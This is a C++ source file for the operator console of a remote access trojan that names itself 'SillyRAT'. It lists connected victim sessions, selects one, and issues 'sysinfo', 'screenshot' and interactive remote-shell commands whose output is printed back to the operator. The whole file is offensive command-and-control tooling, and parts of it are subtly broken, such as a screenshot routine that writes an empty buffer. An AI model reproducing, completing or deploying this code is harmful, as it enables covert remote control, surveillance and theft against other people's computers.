#include <iostream>
#include <string>
#include <cstring>
#include <map>
#include <fstream>
#include <ctime>
#include <vector>

using namespace std;

class INTERFACE{
private:
    string inputSv;
    string sockAddr;
    string current_address;
    int current_descriptor;
    int port;

    COLORS color;
    INPUT inputIf;
    SERVER *middle_face;

public:
    INTERFACE(){
        this->inputSv  = "";
        this->sockAddr = "0.0.0.0";
        this->port     = 54000;
    }
    INTERFACE(const string vala, const int valb){
        this->inputSv  = "";
        this->sockAddr = vala;
        this->port     = valb;
    }
    std::string currentDateTime() {
        time_t     now = time(0);
        struct tm  tstruct;
        char       buf[80];
        tstruct = *localtime(&now);
        strftime(buf, sizeof(buf), "%Y-%m-%d.%X", &tstruct);

        return buf;
    }
    void setMiddleFace(SERVER *middle_face){
        this->middle_face = middle_face;
    }
    bool checkConnection(){
        bool status = false;
        if(this->current_descriptor != 0 && this->current_address != ""){
            std::map<int, std::string> sessions = this->middle_face->retClients();
            std::map<int, std::string>::iterator sessions_it;

            for(sessions_it=sessions.begin(); sessions_it != sessions.end(); sessions_it++){
                if(this->current_descriptor == sessions_it->first){
                    status = true;
                }
            }
        }
        if(status == false && this->current_address != ""){
            this->disconnectSession();
            return false;
        }else{
            return true;
        }
    }
    void listSessions(){
        std::map<int, std::string> sessions = this->middle_face->retClients();
        std::map<int, std::string>::iterator sessions_it;

        if(sessions.size() > 0){
            cout << endl;
            cout << color.BOLD << "   Descriptor   :      Ip Address  " << color.END << endl;
        
            for(sessions_it=sessions.begin(); sessions_it != sessions.end(); sessions_it++){
                if(sessions_it->second != ""){
                    cout << "   " << sessions_it->first << "            :      " <<sessions_it->second << endl;
                }
            }
            cout << endl;
        }else{
            cout << color.RED << "~ " << color.END << "No Sessions Found!" << endl; 
        }
    }
    void operateSession(const string input_string){
        std::vector<std::string> words = color.split(input_string);
        std::map<int, std::string> sessions = this->middle_face->retClients();
        std::map<int, std::string>::iterator sessions_it;

        if(words.size() >= 2){
            for(sessions_it=sessions.begin(); sessions_it != sessions.end(); sessions_it++){
                if((to_string(sessions_it->first) == words[1]) && (sessions_it->second != "")){
                    this->current_address    = sessions_it->second;
                    this->current_descriptor = sessions_it->first;
                    break;
                }
            }
            if(this->current_address == ""){
                cout << color.RED << "~ " << color.END << "No Such Descriptor Found!" << endl;               
            }
        }else{
            cout << color.RED << "~ " << color.END << "Invalid Command!" << endl;
        }
    }
    void disconnectSession(){
        if(this->current_address != ""){
            this->current_address = "";
            this->current_descriptor = 0;
            cout << color.RED << "~ " << color.END << "Disconnected from the target Client!" << endl;
        }else{
            cout << color.RED << "~ " << color.END << "Nothing to Disconnect!" << endl;
        }
    }
    void spawnShell(){
        if(this->current_address != ""){
            string ii;
            string output;
            bool status;

            cout << endl;
            cout << "# Shell v1.0. SillyRAT" << endl;
            while(true){
                cout << "# ";
                ii = this->inputIf.getInput();;

                if(checkConnection() == true){
                    if(ii == "exit"){
                        cout << endl;
                        break;
                    }else if(ii.length() > 0){
                        status = this->middle_face->sendData(current_descriptor, ii, true);
                        if(status){
                            output = this->middle_face->receiveData(current_descriptor);
                            if(output.length() > 0){
                                cout << output << endl << endl;
                            }else{
                                cout << "Nothing Returned from Server!" << endl;
                                cout << endl;
                            }
                        }else{
                            cout << "# Send Command failed!" << endl;
                        }
                    }
                }else{
                    break;
                }
            }
        }else{
            cout << color.RED << "~ " << color.END << "This command is available after you have connected with a session!" << endl;
        }
    }
    void sysinfoSession(){
        bool status = this->middle_face->sendData(current_descriptor, "sysinfo");
        if(status){
            cout << this->middle_face->receiveData(current_descriptor) << endl;
        }
    }
    void screenshotSession(){
        bool status = this->middle_face->sendData(current_descriptor, "screenshot");
        string towrite;
        fstream writer;
        if(status){
            string fname = this->currentDateTime() + ".jpeg";
            writer.open(fname.c_str(), std::ios::binary);
            writer.write(towrite.c_str(), sizeof(towrite));
            writer.close();
            cout << "Written Image to File: " << fname << endl;
        }
    }
    void engage(){
        bool status;
        while(true){
            color.showLiner(current_address, current_descriptor);
            this->inputSv = this->inputIf.getInput();

            status = this->checkConnection();
            if(status == true){
                if(this->inputSv == "exit"){
                    break;
                }else if(this->inputSv == "help"){
                    this->inputIf.getServerHelp();
                }else if(this->inputSv.rfind("sessions", 0) == 0){
                    this->listSessions();
                }else if(this->inputSv.rfind("connect", 0) == 0){
                    this->operateSession(this->inputSv);
                }else if(this->inputSv.rfind("disconnect", 0) == 0){
                    this->disconnectSession();
                }else if(this->inputSv.rfind("screenshot", 0) == 0){
                    this->screenshotSession();
                }else if(this->inputSv.rfind("sysinfo", 0) == 0){
                    this->sysinfoSession();
                }else if(this->inputSv.rfind("shell", 0) == 0){
                    this->spawnShell();
                }else{
                    if(this->inputSv != ""){
                        cout << color.RED << "~ " << color.END << "Invalid Command!" << endl;
                    }
                }
            }
        }
    }
};